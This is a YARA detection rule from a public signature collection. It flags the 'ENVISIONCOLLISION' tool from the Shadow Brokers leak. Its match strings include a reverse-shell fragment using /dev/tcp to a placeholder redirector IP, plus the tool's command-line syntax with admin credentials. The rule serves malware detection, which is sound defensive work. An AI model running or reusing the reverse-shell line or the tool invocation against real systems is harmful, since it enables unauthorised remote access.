rule SIGNATURE_BASE_FVEY_Shadowbroker_User_Tool_Envisioncollision
{
	meta:
		description = "Auto-generated rule - file user.tool.envisioncollision.COMMON"
		author = "Florian Roth (Nextron Systems)"
		id = "a738e270-a3ea-5d38-8933-797d1bd9036a"
		date = "2016-12-17"
		modified = "2023-12-05"
		reference = "https://bit.no.com:43110/theshadowbrokers.bit/post/message6/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/995df52f47284d130b8cbf57d08c31e927e44c09/yara/apt_fvey_shadowbroker_dec16.yar#L336-L352"
		license_url = "https://github.com/Neo23x0/signature-base/blob/995df52f47284d130b8cbf57d08c31e927e44c09/LICENSE"
		logic_hash = "36b2a20ef3a6540a686d7f52c8c885842fd84ba7c7daa74c21e241e25826030e"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "2f04f078a8f0fdfc864d3d2e37d123f55ecc1d5e401a87eccd0c3846770f9e02"

	strings:
		$x1 = "-i<IP> -p<port> -U<user> -P<password> -D<directory> -c<commands>" fullword ascii
		$x2 = "sh</dev/tcp/REDIR_IP/SHELL_PORT>&0" fullword ascii
		$x3 = "-n ENVISIONCOLLISION" ascii
		$x4 = "-UADMIN -PPASSWORD -i127.0.0.1 -Dipboard" fullword ascii

	condition:
		1 of them
}
